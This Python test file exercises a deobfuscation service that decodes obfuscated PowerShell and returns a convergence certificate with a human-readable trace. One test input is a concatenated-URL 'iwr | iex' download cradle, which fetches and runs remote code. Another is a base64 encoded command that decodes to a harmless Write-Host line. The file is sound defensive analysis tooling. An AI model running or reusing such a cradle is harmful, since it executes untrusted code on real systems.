"""
M7 · Convergence Certificate Emission — integration tests.

Verifies:
  * The certificate reaches the wire on `/api/decode/certificate`.
  * The response is deterministic (fingerprint hash-stable).
  * `human_trace` is included in the response.
  * Iteration-level detail is exposed.
  * The `/api/decode/smart` path continues to emit the certificate
    on M6-adopted inputs (regression proof).
  * `human_trace` correctly summarizes multi-iteration runs.
"""
from __future__ import annotations

from fastapi.testclient import TestClient

from workspace.convergence import Artifact, converge
from workspace.convergence.selector import human_trace, convergence_decode


# ─── Selector-level unit tests (no HTTP) ────────────────────────────


class TestHumanTrace:
    def test_summary_line_present(self) -> None:
        result = converge(Artifact.from_input("$a='ht'+'tp'"))
        trace = human_trace(result)
        assert "Convergence completed" in trace
        assert "canonical=YES" in trace
        assert "Certificate fingerprint:" in trace

    def test_iteration_headers_present(self) -> None:
        result = converge(Artifact.from_input("$a='ht'+'tp'"))
        trace = human_trace(result)
        # At least one iteration must be labelled.
        assert "Iteration 1:" in trace

    def test_transformations_listed_when_they_fire(self) -> None:
        payload = (
            "powershell.exe -encod "
            "VwByAGkAdABlAC0ASABvAHMAdAAgACIAdAB3AGUAZQB0ACwAIAB0AHcAZQBlAHQAIQAiAA=="
        )
        trace = human_trace(converge(Artifact.from_input(payload)))
        assert "decoder-powershell-encoded-command" in trace


class TestSelectorEnvelope:
    def test_human_trace_field_included(self) -> None:
        payload = "$a='ht'+'tp'"
        envelope = convergence_decode(payload)
        assert envelope is not None
        assert "human_trace" in envelope
        assert isinstance(envelope["human_trace"], str)
        assert "Convergence completed" in envelope["human_trace"]


# ─── HTTP integration via TestClient ────────────────────────────────


def _client_with_auth_bypass() -> TestClient:
    """Build a TestClient that bypasses authentication so we can
    exercise `/api/decode/certificate` without provisioning a real
    user session."""
    from server import app
    from routers.auth import get_current_user

    def _mock_user():
        return {"id": "test-user", "email": "test@example.com"}

    app.dependency_overrides[get_current_user] = _mock_user
    return TestClient(app)


class TestCertificateEndpoint:
    def test_endpoint_returns_certificate_for_s001(self) -> None:
        client = _client_with_auth_bypass()
        payload = (
            "powershell.exe -encod "
            "VwByAGkAdABlAC0ASABvAHMAdAAgACIAdAB3AGUAZQB0ACwAIAB0AHcAZQBlAHQAIQAiAA=="
        )
        r = client.post("/api/decode/certificate", json={"input": payload})
        assert r.status_code == 200, r.text
        d = r.json()
        assert d["engine"] == "convergence"
        assert d["canonical"] is True
        assert d["output"] == 'Write-Host "tweet, tweet!"'
        # Machine-readable certificate present.
        assert "convergence_certificate" in d
        cert = d["convergence_certificate"]
        assert cert["canonical_state"] is True
        assert cert["ready_for_behavioral_analysis"] is True
        # Fingerprint is a 64-char hex SHA-256.
        assert len(d["certificate_fingerprint"]) == 64
        # Analyst-friendly trace present.
        assert "Convergence completed" in d["human_trace"]
        assert "decoder-powershell-encoded-command" in d["human_trace"]
        # Iteration-level detail exposed.
        assert d["iterations_detail"]
        assert d["iterations_detail"][0]["iteration"] == 1

    def test_endpoint_is_deterministic(self) -> None:
        client = _client_with_auth_bypass()
        payload = "$a='ht'+'tp'+'://ex'+'ample.com/x'; iwr $a -useb | iex"
        fingerprints = set()
        outputs = set()
        for _ in range(3):
            r = client.post("/api/decode/certificate", json={"input": payload})
            assert r.status_code == 200
            fingerprints.add(r.json()["certificate_fingerprint"])
            outputs.add(r.json()["output"])
        assert len(fingerprints) == 1
        assert len(outputs) == 1

    def test_endpoint_handles_already_canonical_input(self) -> None:
        """For an already-canonical input the engine has nothing to do.
        The endpoint must still emit a valid certificate saying
        `canonical_state=YES` with 1 iteration."""
        client = _client_with_auth_bypass()
        payload = 'Write-Host "tweet, tweet!"'
        r = client.post("/api/decode/certificate", json={"input": payload})
        assert r.status_code == 200
        d = r.json()
        assert d["canonical"] is True
        assert d["iterations_executed"] == 1
        assert d["output"] == payload
